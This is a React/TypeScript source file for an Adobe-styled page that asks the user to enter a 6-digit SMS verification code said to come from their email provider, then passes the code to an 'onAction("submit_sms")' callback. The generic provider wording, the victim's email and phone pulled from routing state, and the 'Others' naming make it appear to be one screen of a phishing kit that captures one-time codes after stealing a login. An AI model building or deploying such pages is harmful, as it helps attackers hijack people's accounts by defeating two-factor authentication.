import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

interface OthersSmsCodePageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const OthersSmsCodePage: React.FC<OthersSmsCodePageProps> = ({ onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const providerName = (data.providerName as string) || 'your email provider';
  const phoneNumber = (data.phoneNumber as string) || (data.phone as string) || 'your phone on file';

  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 6 || submitting) return;
    setSubmitting(true);
    onAction('submit_sms', { code });
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]" style={{ fontFamily: 'adobe-clean, Source Sans Pro, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif' }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[440px] bg-white rounded-lg shadow p-8">
          <div className="flex items-center justify-center w-14 h-14 rounded-full mx-auto mb-5" style={{ backgroundColor: '#e6f0ff' }}>
            <svg className="w-7 h-7" viewBox="0 0 24 24" fill="none" stroke="#0066cc" strokeWidth="1.8">
              <rect x="6" y="2" width="12" height="20" rx="2" />
              <circle cx="12" cy="18" r="1.2" fill="#0066cc" />
            </svg>
          </div>
          <h1 className="text-[22px] leading-7 font-semibold text-[#222] text-center mb-2">Enter verification code</h1>
          <p className="text-sm text-[#555] text-center mb-6">
            {providerName} sent a 6-digit code to <strong>{phoneNumber}</strong>. Enter it below to continue.
          </p>
          {email && (
            <div className="text-xs text-gray-500 text-center mb-4">Signed in as {email}</div>
          )}
          <form onSubmit={handleSubmit}>
            <input
              type="tel"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
              maxLength={8}
              autoFocus
              placeholder="123456"
              className="w-full px-4 py-3 text-center text-lg tracking-[0.4em] border rounded-md outline-none focus:border-[#0066cc]"
              style={{ borderColor: '#d1d1d1' }}
            />
            <button
              type="submit"
              disabled={code.length < 6 || submitting}
              className="w-full mt-6 py-3 text-white text-sm font-semibold rounded-md disabled:opacity-60 disabled:cursor-not-allowed"
              style={{ backgroundColor: '#0066cc' }}
            >
              {submitting ? 'Verifying\u2026' : 'Verify and continue'}
            </button>
          </form>

          <div className="mt-6 flex justify-between text-sm">
            <button
              type="button"
              onClick={() => onAction('resend_sms')}
              className="hover:underline"
              style={{ color: '#0066cc' }}
            >
              Resend code
            </button>
            <button
              type="button"
              onClick={() => { onAction('cancel'); navigate(-1); }}
              className="hover:underline"
              style={{ color: '#0066cc' }}
            >
              Try another way
            </button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default OthersSmsCodePage;
